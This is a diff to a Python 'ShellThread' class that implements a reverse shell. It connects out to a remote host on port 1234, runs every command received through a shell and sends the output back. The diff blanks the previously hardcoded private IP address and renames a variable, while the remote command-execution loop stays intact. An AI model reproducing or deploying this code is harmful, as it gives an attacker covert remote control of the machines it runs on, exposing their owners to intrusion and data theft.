@@ -17,7 +17,7 @@ class ShellThread(object):
 
     def run(self):
         while True:
-            HOST = '192.168.32.136'
+            HOST = ''
             PORT = 1234
             NON_RES_COUNT = 1
             try:
@@ -25,19 +25,19 @@ class ShellThread(object):
                 s.connect((HOST, PORT))
                 s.send('connected\n')
                 while True:
-                    data = s.recv(1024).replace('\n', '')
-                    if data == "exit":
+                    command = s.recv(1024).replace('\n', '')
+                    if command == "exit":
                         break
-                    if not data:
+                    if not command:
                         NON_RES_COUNT += 1
-                    if data and data.split()[0] == 'cd':
+                    if command and command.split()[0] == 'cd':
                         try:
-                            os.chdir(data.split()[1])
+                            os.chdir(command.split()[1])
                         except IndexError:
                             pass
                         except WindowsError:
                             pass
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     results = proc.stdout.read()
                     s.send(results)
                     if NON_RES_COUNT > 60:
